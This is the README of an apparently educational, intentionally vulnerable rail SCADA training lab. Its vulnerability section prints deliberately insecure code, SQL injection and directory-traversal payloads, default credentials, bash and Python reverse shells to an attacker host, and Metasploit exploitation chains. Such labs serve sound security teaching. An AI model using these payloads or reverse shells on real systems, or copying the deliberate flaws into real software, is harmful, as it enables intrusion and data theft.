# 🚂 SC Rail Network — ICS/SCADA Training Lab

> **Industrial Control System simulation for authorized cybersecurity education and assessment training.**

[![License: MIT](https://img.shields.io/badge/License-MIT-cyan.svg)](#license)
[![Platform: Debian 12](https://img.shields.io/badge/Platform-Debian%2012-blue.svg)](#requirements)
[![Python: 3.11+](https://img.shields.io/badge/Python-3.11+-green.svg)](#requirements)
[![Dependencies: Zero](https://img.shields.io/badge/Dependencies-Zero-brightgreen.svg)](#zero-dependency-architecture)
[![Offline: 100%](https://img.shields.io/badge/Offline-100%25-orange.svg)](#offline-capability)
[![MITRE ATT&CK: Mapped](https://img.shields.io/badge/MITRE%20ATT%26CK-Mapped-red.svg)](#mitre-attck-mapping)

---

## Overview

A complete ICS/SCADA training lab environment built around a realistic **South Carolina Rail Network Control System**. The application is served through a Python web server with an intentionally vulnerable authentication layer, designed as an exploitation target for classroom-based penetration testing exercises using tools like Metasploit Framework (`msfconsole`).

This project provides students with a visually compelling, functionally realistic industrial control system to practice against — rather than a sterile form with a text field. The goal is to make training scenarios feel grounded in operational technology (OT) environments that mirror real-world infrastructure.

> **Companion project:** A standalone **Hoover Dam 3D Structural Schematic** previously bundled in this repository now lives in its own project. See that project's README for details.

### What's Included

| Component | Description |
|---|---|
| **SC Rail Network Control System** | Full interactive SCADA-style GUI built over a geographically accurate South Carolina county map, with live train tracking, switch/bridge/signal control, and physics-based movement and braking |
| **Vulnerable Web Server** | Python stdlib server with intentional SQL injection, command injection, directory traversal, and credential weaknesses |
| **Automated Installer** | One-command Debian 12 setup with systemd service and database initialization |
| **Instructor Guide** | Full exploitation walkthrough with msfconsole commands, MITRE ATT&CK mappings, and tiered exercise paths |

### Zero-Dependency Architecture

The entire server runs on **Python 3 standard library only** — specifically `wsgiref.simple_server` (Python's built-in WSGI reference implementation). There is no Flask, no pip, no venv, no virtualenv, no package manager interaction of any kind. If Python 3 is installed, the server runs. This was a deliberate design choice for air-gapped lab networks where package repositories and internet access are unavailable.

```
External dependencies required: 0
Python packages to install:     0
Internet access needed:         No
```

---

## SC Rail Network Control System

The centerpiece of the lab — a single-file, zero-dependency HTML application (~1,700 lines) that simulates a SCADA-style rail network control interface for the state of South Carolina.

### Geographically Accurate Map

The control interface is rendered over a **real South Carolina county map** (all 46 counties, embedded as inline SVG) rather than a hand-drawn outline. Cities, tracks, signals, bridges, and junctions are all placed against this map using a calibrated geographic projection, so the network reflects the true layout of the state.

- **Real county basemap** — 46 SC counties embedded as inline SVG, scaled into the control canvas; counties highlight subtly on hover and recede behind the rail network so the operational layer stays the focus
- **Calibrated lat/lon projection** — city coordinates are derived from real latitude/longitude via an affine projection fit to county centroids, so stations sit in their true locations (the upstate cluster, the midlands hub at Columbia, the coastal cities, the Savannah River on the Georgia border, etc.)
- **Track-anchored infrastructure** — every signal, bridge, and junction computes its on-screen position from the track segment it belongs to (and its fractional position along that segment), so markers always sit precisely on the rail lines regardless of map scale
- **River-accurate bridge placement** — each river bridge is positioned at the point its named river actually crosses the rail line (e.g. the Savannah River Bridge sits on the Aiken → North Augusta line at the GA border, the Cooper River Bridge at Charleston harbor)

### Realistic Train Simulation

- **10 active trains** — 7 freight services (CSX, NS, Palmetto) and 3 Amtrak passenger services
- **Physics-based movement** — each train's speed (25–60 mph) is calculated against real segment mileage
  - A 35 mph freight train on the 40-mile Columbia → Newberry segment takes ~69 minutes of sim-time
  - An Amtrak service at 60 mph covers the same 40-mile segment in ~40 minutes
  - Speed formula: `progress_per_sim_second = effective_mph / (segment_miles × 3600)`
- **Continuous acceleration and braking** — trains do not snap between full speed and a dead stop. Each train carries a speed ratio (0–1 of its max) and eases between speeds, decelerating faster than it accelerates, mirroring real equipment
- **Braking-distance awareness** — a train scans ahead for a red signal or open bridge and begins slowing at a realistic braking distance, scaled to its speed and type (freight needs a longer stopping zone than a lighter passenger consist), then holds at the obstruction and accelerates away once the block clears
- **Realistic operational behaviors**
  - Station dwells at junctions (brief stops, ~45 s–2 min)
  - End-of-route turnaround dwell (~2–6 min)
  - Random operational holds: track maintenance, grade crossing delays, crew changes, freight loading, speed restriction zones, track inspections
- **Continuous mileage tracking** — each train accumulates distance traveled continuously, frame by frame, in proportion to the distance actually covered (not in whole-segment chunks); displayed live in the per-train control panel and tooltip
- Animated pulse rings on moving trains (including while braking), blinking stop indicators only on trains actually held at a signal, bridge, or station
- Per-train control panel showing: current segment, mile marker within segment, ETA to next station, total miles traveled, full route display with current-position highlight

### Switching Stations (10 Switches)

Located at all major junctions: Columbia, Florence, Greenville, Spartanburg, Charleston, Orangeburg, Kingstree, Aiken, Rock Hill, Sumter. Each junction marker is snapped to its city's true position on the map.

| Control | Description |
|---|---|
| Toggle Normal/Diverging | Switches between main and diverging track alignment |
| Lock Switch | Locks switch in current position to prevent remote changes |
| Emergency Override | Forces switch to NORMAL position with alert |

Visual diamond indicator on map — green for normal, amber for diverging — with glow effect.

### Bridge Control (8 Bridges)

Each bridge is one of two mechanically distinct types with animated state transitions, positioned where its river crosses the rail line:

**Swing Bridges (4)** — Cooper River, Wateree River, Pee Dee River, Edisto River

- Rotating center span animated around a visible pivot point
- Fixed abutments remain stationary on both sides while the deck rotates through 90°
- Truss members and pivot indicator dot with glow effect visible during rotation

**Bascule Bridges (4)** — Congaree River, Broad River, Savannah River, Santee River

- Hinged leaf tilts upward to 70° from a pier-mounted hinge point
- Counterweight element becomes visible as the leaf raises
- Truss diagonal members rendered on the leaf structure

**Operating Sequence** (realistic for both types):

```
OPEN:   Sound Horn → Lower Traffic Gates → Release Lock Pins → Move Span
CLOSE:  Return Span → Engage Lock Pins → Raise Gates → Silence Horn
```

**Bridge Control Panel:**

| Control | Description |
|---|---|
| Open Bridge | Initiates full opening sequence (only when fully closed) |
| Close Bridge | Initiates closing sequence (only when fully open) |
| Emergency Stop Movement | Halts span mid-travel at current position |
| Emergency Force Close | Overrides state and forces immediate closing |
| Horn Test | Sounds warning horn for 3 seconds |
| Run Diagnostics | Simulated multi-point inspection (hydraulics, lock pins, motor, position sensor, alignment) |

**Real-time subsystem readout:**

- Span position percentage with animated progress bar
- Horn status (active/silent)
- Gate status (normal/lowered)
- Lock pin status (engaged/released)
- Operating sequence reference diagram

When a bridge opens, approaching trains detect it at braking distance and slow to a hold; nearby signals on the same track segment are automatically set to **RED** while the bridge is open and restored to **GREEN** once it is fully closed.

### Signal Control (16 Signals)

- Three-aspect signaling: **GREEN** (Clear), **AMBER** (Approach), **RED** (Stop)
- Animated pulsing glow on active aspect
- Manual aspect selection via control panel buttons
- Each signal is placed on its track segment at the approach or departure point of the relevant junction, anchored to the line
- **Auto-Signal Mode** toggle — when enabled, signals automatically transition:
  - GREEN → AMBER when a moving train approaches within proximity
  - → RED when a bridge on the same track segment opens
  - → GREEN when the block clears
- **Lamp Test** function — cycles through RED → AMBER → GREEN → restore
- A red signal causes an approaching train to begin braking at a realistic distance and hold at the signal

### Simulation Speed Controls

The interface **defaults to 300× on load** so traffic flow is immediately visible; the full range remains available:

| Speed | Ratio | Use Case |
|---|---|---|
| ⏸ Pause | 0× | Freeze all movement for inspection |
| 1× | Real-time | Observe individual train behavior at actual pace |
| 5× | 5:1 | Watch trains move between nearby cities |
| 20× | 20:1 | Observe full route traversals in minutes |
| 60× | 60:1 | 1 sim-hour per real minute — daily traffic patterns |
| **300×** | **300:1** | **Default.** Full day of operations in ~5 minutes |

### Event Log

- Timestamped (sim-time) log of all system events
- Color-coded by severity: cyan (info), amber (warning), red (error/emergency)
- Captures: switch toggles, bridge operations, signal changes, train holds, emergency actions, diagnostics results
- Auto-scrolling with 150-entry circular buffer

#### User Interface Layout

```
┌──────────────────────────────────────────────────────────────────┐
│  SCRN LOGO      System Online │ Network │ Alerts │ Clock        │
├──────────┬───────────────────────────────────────┬───────────────┤
│          │          [Simulation Speed Bar]        │               │
│ Active   │                                       │   Control     │
│ Trains   │      REAL SC COUNTY MAP (SVG)         │   Panel       │
│ (list)   │   ┌──tracks──cities──bridges──┐       │               │
│          │   │   animated trains         │       │  (switches    │
│ Switches │   │   signals  switches       │       │   to context  │
│ (list)   │   │   rivers   mileage labels │       │   of selected │
│          │   └───────────────────────────┘       │   element)    │
│ Bridges  │                                       │               │
│ (list)   │       [+] [-] [⌂] zoom controls       │               │
│          │                                       │               │
│ Signals  │                                       │               │
│ (list)   │                                       │               │
│          │                                       │               │
│ Event    │                                       │               │
│ Log      │                                       │               │
├──────────┴───────────────────────────────────────┴───────────────┤
│  v2.5    │  LAT/LON  │  Active Trains  │  Sim Time  │  Offline  │
└──────────────────────────────────────────────────────────────────┘
```

### Real-World Mileage Reference

| Segment | Miles | Operator | Type |
|---|---|---|---|
| Florence → Sumter | 52 | CSX | Main |
| Sumter → Columbia | 44 | CSX | Main |
| Columbia → Newberry | 40 | CSX | Main |
| Newberry → Clinton | 22 | CSX | Main |
| Clinton → Laurens | 15 | CSX | Main |
| Laurens → Greenville | 35 | CSX | Main |
| Florence → Kingstree | 40 | CSX | Main |
| Kingstree → Charleston | 68 | CSX | Main |
| Greenville → Spartanburg | 30 | NS | Main |
| Spartanburg → Rock Hill | 55 | NS | Main |
| Rock Hill → Chester | 20 | NS | Main |
| Chester → Columbia | 55 | NS | Main |
| Columbia → Orangeburg | 40 | NS | Main |
| Orangeburg → Charleston | 75 | NS | Main |
| Columbia → Aiken | 55 | NS | Secondary |
| Aiken → N. Augusta | 18 | NS | Secondary |
| Aiken → Denmark | 30 | CSX | Secondary |
| Denmark → Orangeburg | 22 | CSX | Secondary |
| Florence → Dillon | 28 | CSX | Main |
| Florence → Hartsville | 25 | CSX | Secondary |
| Hartsville → Camden | 35 | CSX | Secondary |
| Camden → Columbia | 32 | CSX | Secondary |
| Greenville → Anderson | 30 | NS | Secondary |
| Kingstree → Georgetown | 38 | CSX | Siding |
| Charleston → Walterboro | 48 | CSX | Secondary |
| Walterboro → Yemassee | 22 | CSX | Secondary |
| Greenville → Greer | 12 | NS | Secondary |
| Greer → Spartanburg | 18 | NS | Secondary |

### Train Roster

| ID | Operator | Type | Speed | Route |
|---|---|---|---|---|
| CSX-4012 | CSX | Freight | 35 mph | Dillon → Florence → Kingstree → Charleston |
| NS-9284 | Norfolk Southern | Freight | 30 mph | Greenville → Spartanburg → Rock Hill → Chester → Columbia |
| CSX-7801 | CSX | Freight | 35 mph | Charleston → Orangeburg → Columbia → Newberry → Clinton → Laurens → Greenville |
| AMT-97 | Amtrak | Passenger | 60 mph | Columbia → Sumter → Florence → Dillon |
| NS-1156 | Norfolk Southern | Freight | 30 mph | Columbia → Aiken → N. Augusta |
| CSX-3350 | CSX | Freight | 28 mph | Florence → Hartsville → Camden → Columbia |
| AMT-19 | Amtrak | Passenger | 55 mph | Charleston → Walterboro → Yemassee |
| NS-6600 | Norfolk Southern | Freight | 25 mph | Greenville → Anderson |
| CSX-8120 | CSX | Freight | 40 mph | Charleston → Kingstree → Florence |
| PLM-201 | Palmetto Railways | Freight | 30 mph | Charleston → Orangeburg → Denmark → Aiken |

---

## Vulnerable Lab Server

A Python web server hosting the rail application behind an intentionally vulnerable authentication layer. Built on `wsgiref.simple_server` (Python standard library WSGI implementation) with zero external dependencies. Designed for exploitation exercises with Metasploit Framework and manual techniques.

### Architecture

```
┌──────────────────────────────────────────────────────┐
│  Debian 12 Host (Target)             Port 8080       │
│                                                      │
│  /opt/scrn-lab/                                      │
│  ├── app.py                 wsgiref WSGI server      │
│  ├── users.db               SQLite database          │
│  ├── download_fonts.sh      Font downloader script   │
│  ├── setup.sh               Automated installer      │
│  ├── templates/                                      │
│  │   ├── login.html         ← SQLi attack surface    │
│  │   ├── dashboard.html     Post-auth hub            │
│  │   ├── diagnostics.html   ← RCE attack surface     │
│  │   └── files.html         ← LFI attack surface     │
│  └── static/                                         │
│      ├── sc_rail_control.html                        │
│      └── fonts/                                      │
│          ├── fonts.css      @font-face declarations  │
│          └── *.ttf          Local font files          │
│                                                      │
│  Server: wsgiref.simple_server (Python stdlib)       │
│  Service: scrn-lab.service (systemd)                 │
└──────────────────────────────────────────────────────┘
```

### Route Map

| Route | Method | Auth | Description |
|---|---|---|---|
| `/login` | GET/POST | No | Authentication page — **SQLi target** |
| `/dashboard` | GET | Yes | Application hub with system status cards |
| `/rail-control` | GET | Yes | SC Rail Network Control System |
| `/diagnostics` | GET/POST | Yes | Network diagnostic tools — **Command injection target** |
| `/files` | GET | Yes | File browser — **Directory traversal target** |
| `/logout` | GET | No | Session termination |
| `/fonts/*` | GET | No | Local font file serving |

### Default Credentials

| Username | Password | Role |
|---|---|---|
| `admin` | `admin123` | admin |
| `operator` | `operator` | operator |
| `engineer` | `hoover2024` | engineer |
| `guest` | `guest` | guest |

---

## Vulnerability Documentation

### VULN 1 — SQL Injection (Authentication Bypass)

| Field | Value |
|---|---|
| **Location** | `POST /login` |
| **Parameters** | `username`, `password` |
| **Root Cause** | String concatenation in SQL query without parameterized statements |
| **Impact** | Full authentication bypass, database extraction |
| **CVSS Analog** | 9.8 Critical |

The login query uses direct string concatenation:

```python
query = "SELECT * FROM users WHERE username='" + username + "' AND password='" + password + "'"
```

**Manual exploitation:**

```
Username: ' OR 1=1--
Password: (anything)
```

Produces:

```sql
SELECT * FROM users WHERE username='' OR 1=1--' AND password='...'
```

**Additional payloads:**

```
admin'--                                                   # Bypass password for admin
' OR '1'='1                                                # Tautology variant
' UNION SELECT 1,'hacker','x','admin','Pwned','2024'--     # Union inject
```

**msfconsole — Credential brute force path:**

```
use auxiliary/scanner/http/http_login
set RHOSTS <target_ip>
set RPORT 8080
set TARGETURI /login
set AUTH_URI /login
set REQUEST_TYPE POST
set USERNAME admin
set PASS_FILE /usr/share/wordlists/rockyou.txt
set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/http_default_userpass.txt
set USER_AS_PASS true
set STOP_ON_SUCCESS true
run
```

**SQLMap (if available in lab):**

```bash
sqlmap -u "http://<target>:8080/login" \
  --data="username=admin&password=test" \
  --method=POST --dbms=sqlite --dump
```

---

### VULN 2 — OS Command Injection (Remote Code Execution)

| Field | Value |
|---|---|
| **Location** | `POST /diagnostics` |
| **Parameter** | `target` |
| **Root Cause** | Unsanitized input passed to `subprocess.Popen(shell=True)` |
| **Impact** | Full remote code execution as server user |
| **Prerequisite** | Authenticated session (bypass login first via SQLi or creds) |
| **CVSS Analog** | 9.8 Critical |

The diagnostics page constructs shell commands without sanitization:

```python
cmd = f"ping -c 3 {target}"
subprocess.Popen(cmd, shell=True, ...)
```

**Manual exploitation (browser, post-auth):**

```
127.0.0.1; id
127.0.0.1; cat /etc/passwd
127.0.0.1; whoami; uname -a
; ls -la /opt/scrn-lab/
; cat /opt/scrn-lab/app.py
```

**Reverse shell via injection:**

Attacker:

```bash
nc -lvnp 4444
```

Diagnostics target field:

```
127.0.0.1; bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1
```

Python variant:

```
; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<ATTACKER_IP>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

**msfconsole — Full exploitation chain:**

Step 1 — Obtain authenticated session:

```bash
curl -v -c cookies.txt \
  -d "username=admin&password=admin123" \
  http://<target>:8080/login -L
```

Step 2a — Handler + manual injection:

```
use exploit/multi/handler
set PAYLOAD cmd/unix/reverse_bash
set LHOST <attacker_ip>
set LPORT 4444
run -j
```

Then inject:

```bash
curl -b cookies.txt \
  -d "tool=ping&target=127.0.0.1;bash -i >%26 /dev/tcp/<attacker_ip>/4444 0>%261" \
  http://<target>:8080/diagnostics
```

Step 2b — Web delivery (Meterpreter):

```
use exploit/multi/script/web_delivery
set TARGET 0                       # Python
set PAYLOAD python/meterpreter/reverse_tcp
set LHOST <attacker_ip>
set LPORT 4444
exploit -j
# Copy the generated command, inject into diagnostics target field
```

Step 2c — Web delivery (bash):

```
use exploit/multi/script/web_delivery
set TARGET 7                       # Unix Command
set PAYLOAD cmd/unix/reverse_bash
set LHOST <attacker_ip>
set LPORT 4444
exploit -j
# Inject generated wget/curl one-liner via:  ; <paste command>
```

---

### VULN 3 — Directory Traversal (Local File Inclusion)

| Field | Value |
|---|---|
| **Location** | `GET /files?path=` |
| **Parameter** | `path` query string |
| **Root Cause** | No path sanitization before `open()` |
| **Impact** | Arbitrary file read on host filesystem |
| **Prerequisite** | Authenticated session |

**Exploitation:**

```
/files?path=../../../etc/passwd
/files?path=../../../etc/shadow
/files?path=../../../opt/scrn-lab/app.py
/files?path=../../../opt/scrn-lab/users.db
/files?path=../../../root/.bash_history
/files?path=../../../proc/self/environ
```

---

### VULN 4 — Weak / Default Credentials

All four user accounts use dictionary words or trivially guessable passwords. No account lockout policy or rate limiting is implemented. Exploitable with Hydra, Burp Intruder, or Metasploit `auxiliary/scanner/http/http_login`.

---

### VULN 5 — Information Disclosure

- **User enumeration**: Failed login returns differentiated error messages — "User not found" vs "Invalid password" — enabling username enumeration
- **SQL error echoing**: Malformed injection payloads return the full query string and Python traceback in the browser
- **Server headers**: All responses include `X-Powered-By: Python/3.11 stdlib` and `Server: SCRN-LabServer/2.5`
- **Command echo**: The diagnostics page displays the exact shell command string that was executed

---

### VULN 6 — Missing Security Controls

- No CSRF tokens on any form
- No rate limiting on login or diagnostics
- Hardcoded `SECRET_KEY` in source code (session forgery possible if discovered via LFI)
- No `Content-Security-Policy`, `X-Frame-Options`, or `X-Content-Type-Options` headers
- No `HttpOnly` or `Secure` flags on session cookies
- Session fixation — no session ID regeneration upon authentication
- In-memory session store — sessions lost on server restart (no persistence layer)

---

## MITRE ATT&CK Mapping

| Technique | ID | Lab Vulnerability |
|---|---|---|
| Exploit Public-Facing Application | [T1190](https://attack.mitre.org/techniques/T1190/) | SQL Injection, Command Injection |
| Valid Accounts: Default Accounts | [T1078.001](https://attack.mitre.org/techniques/T1078/001/) | Weak/default credentials |
| Command and Scripting Interpreter: Unix Shell | [T1059.004](https://attack.mitre.org/techniques/T1059/004/) | Command Injection → reverse shell |
| Unsecured Credentials: Credentials in Files | [T1552.001](https://attack.mitre.org/techniques/T1552/001/) | Plaintext SQLite DB, hardcoded secret key |
| Data from Information Repositories | [T1213](https://attack.mitre.org/techniques/T1213/) | Directory traversal arbitrary file read |
| Brute Force: Password Guessing | [T1110.001](https://attack.mitre.org/techniques/T1110/001/) | No rate limiting on authentication |
| System Information Discovery | [T1082](https://attack.mitre.org/techniques/T1082/) | Command injection → `uname -a`, `id`, `hostname` |
| File and Directory Discovery | [T1083](https://attack.mitre.org/techniques/T1083/) | Directory traversal, command injection `ls` |
| Account Manipulation | [T1098](https://attack.mitre.org/techniques/T1098/) | SQL injection INSERT/UPDATE to users table |
| Indicator Removal: Clear Command History | [T1070.003](https://attack.mitre.org/techniques/T1070/003/) | Post-exploitation via RCE shell access |

---

## Suggested Exercise Flow

### 🟢 Beginner

1. Browse to `http://<target>:8080` and observe the login page
2. Attempt default credentials from the table above
3. Explore the dashboard — open the Rail Control application
4. Interact with the Rail Control System: toggle a switch, open a bridge (watch an approaching train brake and hold), change a signal
5. Attempt basic SQL injection on the login form: `' OR 1=1--`
6. Read the error messages — note what information is disclosed

### 🟡 Intermediate

1. Use `nmap -sV -p 8080 <target>` to fingerprint the service
2. Use Metasploit `auxiliary/scanner/http/http_login` to brute-force credentials
3. After login, navigate to the diagnostics page
4. Exploit command injection: `127.0.0.1; cat /etc/passwd`
5. Use directory traversal to read the application source: `../../../opt/scrn-lab/app.py`
6. Extract the SQLite database: `/files?path=../../../opt/scrn-lab/users.db`
7. Analyze the source code to discover additional vulnerability classes

### 🔴 Advanced

1. Perform full service enumeration with `nmap`, `nikto`, and `dirb`/`gobuster`
2. Bypass authentication exclusively via SQL injection without knowing any credentials
3. Chain: SQLi auth bypass → authenticated session → command injection → reverse shell
4. Use Metasploit `exploit/multi/script/web_delivery` to establish a Meterpreter session
5. Post-exploitation: enumerate the host, escalate privileges, establish persistence
6. Forge a session cookie using the hardcoded secret key found via directory traversal
7. Write a comprehensive penetration test report documenting all findings per NIST SP 800-115

---

## Installation

### Requirements

- **Debian 12** (Bookworm) — tested on clean minimal and desktop installs
- **Python 3.11+** (included in Debian 12)
- **Root access** for initial setup and binding to port 8080
- **Isolated network** — do not expose to untrusted network segments

### Quick Start

```bash
# Clone or extract the project
git clone https://github.com/<your-org>/scrn-lab.git
cd scrn-lab

# Run immediately — no setup needed
sudo python3 app.py

# Or run the full automated setup (systemd service, helpers)
sudo chmod +x setup.sh
sudo ./setup.sh
```

The server starts immediately with `python3 app.py` — no package installation, no virtual environment, no compilation step. The `setup.sh` script is optional and provides systemd integration, helper scripts, and deployment to `/opt/scrn-lab/`.

### What `setup.sh` Does

- Installs system utilities (`net-tools`, `traceroute`, `dnsutils`, `sqlite3`) — **not** pip or any Python packages
- Copies application files to `/opt/scrn-lab/`
- Initializes the SQLite database with default users
- Creates and enables `scrn-lab.service` (systemd)
- Generates helper scripts: `start.sh`, `stop.sh`, `reset-db.sh`

### Manual Start (No Setup Required)

```bash
cd scrn-lab
sudo python3 app.py
```

---

## Service Management

```bash
# Start / stop / restart
sudo systemctl start scrn-lab
sudo systemctl stop scrn-lab
sudo systemctl restart scrn-lab
sudo systemctl status scrn-lab

# Live log stream
journalctl -u scrn-lab -f

# Reset database to default credentials
/opt/scrn-lab/reset-db.sh

# Manual foreground run (useful for debugging)
cd /opt/scrn-lab
sudo python3 app.py
```

---

## Offline Capability

The entire project is designed for air-gapped lab networks with no internet access.

### Server

Runs on Python 3 standard library (`wsgiref.simple_server`). Zero packages to install, zero downloads, zero network calls. If `python3` exists on the box, the server runs.

### Rail Control System

100% offline. Single-file HTML with inline CSS/JS, an inline (embedded) South Carolina county map SVG, and inline SVG rendering for the network. No external requests of any kind — the map is part of the file, not a fetched asset.

### Fonts

All templates reference local font files via `static/fonts/fonts.css` with `@font-face` declarations pointing to local `.ttf` files. System fallbacks are specified so the UI renders correctly even without the font files. If the rail HTML is served on a host with a strict Content-Security-Policy that blocks external stylesheets, the original Google Fonts import is simply ignored and the UI falls back to the system fonts cleanly.

To download the custom fonts (one-time, from any internet-connected machine):

```bash
chmod +x download_fonts.sh
./download_fonts.sh

# Copy to lab host:
scp -r static/fonts/*.ttf labhost:/opt/scrn-lab/static/fonts/
```

**Font families used:**

| Font | Role | System Fallback |
|---|---|---|
| Orbitron | Headings, HUD labels | `monospace` |
| Share Tech Mono | Terminal readouts, data | `'Courier New', monospace` |
| Rajdhani | Body text, UI elements | `Verdana, sans-serif` |
| Courier Prime | Code, data display | `'Courier New', monospace` |

---

## Project Structure

```
scrn-lab/
├── README.md                              ← This file
├── app.py                                 ← WSGI server (wsgiref, all vuln logic)
├── setup.sh                               ← Debian 12 automated installer
├── download_fonts.sh                      ← Font downloader (run on internet machine)
├── templates/
│   ├── login.html                         ← Auth page (SQLi surface)
│   ├── dashboard.html                     ← Post-auth application hub
│   ├── diagnostics.html                   ← Network tools (RCE surface)
│   └── files.html                         ← File browser (LFI surface)
├── static/
│   ├── sc_rail_control.html               ← SC Rail Network Control System
│   └── fonts/
│       ├── fonts.css                      ← @font-face declarations
│       └── *.ttf                          ← Font files (via download_fonts.sh)
└── users.db                               ← SQLite database (created at runtime)
```

| File | Lines | Description |
|---|---|---|
| `app.py` | ~410 | WSGI server — SQLi, RCE, LFI vulnerabilities, auth, routing |
| `sc_rail_control.html` | ~1,700 | Complete rail SCADA simulation: real SC county basemap, geographic projection, physics-based movement and braking |
| `login.html` | ~60 | Industrial-themed authentication page |
| `dashboard.html` | ~65 | Post-auth hub with system cards and status indicators |
| `diagnostics.html` | ~66 | Network diagnostics form with terminal output |
| `files.html` | ~57 | File browser with path input |
| `setup.sh` | ~264 | Automated Debian 12 deployment and systemd setup |
| `download_fonts.sh` | ~40 | Google Fonts downloader for offline font bundling |
| `fonts.css` | ~100 | Local @font-face declarations for all font families |

---

## Technology Stack

| Layer | Technology |
|---|---|
| HTTP Server | `wsgiref.simple_server` (Python 3 stdlib WSGI) |
| Database | SQLite 3 (Python `sqlite3` module) |
| Template Engine | Custom regex-based (stdlib `re`) |
| Process Management | systemd |
| Session Store | In-memory Python dict |
| Rail Control UI | Vanilla HTML / CSS / JavaScript, inline SVG, embedded SC county basemap |
| Geographic Projection | Affine lat/lon → SVG fit to county centroids |
| Typography | Orbitron, Rajdhani, Share Tech Mono, Courier Prime |
| Target OS | Debian 12 (Bookworm) |
| External Dependencies | **None** |

---

## Technical Notes

### Geographic Accuracy

The rail map is rendered over a real South Carolina county map (46 county polygons embedded as inline SVG). City positions are derived from real latitude/longitude through an affine projection that was fit to county centroids, capturing the slight rotation of the source map so coastal and border cities land correctly. Signals, bridges, and junctions are not hardcoded to pixel coordinates — they are computed at runtime from the track segment they belong to and a fractional position along it, so every marker stays locked to the rail line and remains correct even if the underlying coordinates are adjusted.

### Why wsgiref Instead of Flask

The original server was built with Flask, but Debian 12 minimal installs on air-gapped networks cannot install pip packages — `python3-pip` pulls in `libpython3.11-dev` which triggers unresolvable dependency chains on space-constrained systems, and PyPI is unreachable without internet. Even the Debian-packaged `python3-flask` may not be available on minimal installs or local mirrors.

`wsgiref.simple_server` is part of Python's standard library and requires zero installation. The WSGI architecture also properly handles HTTP response lifecycle — the earlier `http.server.BaseHTTPRequestHandler` implementation caused `NS_ERROR_NET_RESET` in Firefox on POST requests due to socket race conditions in the handler's connection management.

### Why Local Fonts

Google Fonts CDN imports (`@import url('https://fonts.googleapis.com/...')`) require internet access, which breaks on air-gapped networks. The `fonts.css` file provides identical `@font-face` declarations pointing to local `.ttf` files, with system font fallbacks so the UI remains functional even without the custom fonts installed.

---

## Screenshots

> *The interface uses a dark industrial-control aesthetic with cyan and green accent colors, monospace instrument readouts, and animated status indicators throughout all screens.*

**Login Page** — Cinematic authentication screen with drifting grid background, CRT scanlines, corner bracket decorations, pulsing logo ring, and "AUTHORIZED PERSONNEL ONLY" warning banner. Error messages intentionally disclose database query details.

**Dashboard** — Post-auth application hub featuring system cards with hover glow effects, animated entry transitions, and a live system status grid.

**SC Rail Control** — Three-panel SCADA layout. Left sidebar lists all active trains, switches, bridges, and signals with color-coded status indicators. Center panel renders the real SC county map as interactive SVG with animated train markers, bridge mechanism icons, and signal aspects locked to the rail lines. Right panel displays context-sensitive controls that change based on the selected map element.

**Network Diagnostics** — Dropdown tool selector (ping, traceroute, nslookup, ARP, netstat) with a target input field and terminal-style output window that echoes both the shell command executed and its results.

---

## ⚠ Disclaimer

This project is **intentionally vulnerable** and designed **exclusively for authorized cybersecurity education** in isolated lab environments.

**DO NOT:**

- Deploy on production systems or networks
- Expose to the internet or any untrusted network segment
- Use against systems without explicit written authorization
- Redistribute as a weaponized tool

All vulnerabilities are deliberately introduced and documented in full for educational transparency. This project teaches defenders how attackers exploit common web application weaknesses in ICS/SCADA-adjacent systems.

---

## License

MIT License — See [LICENSE](LICENSE) for details.

[jhenry.io](https://jhenry.io)
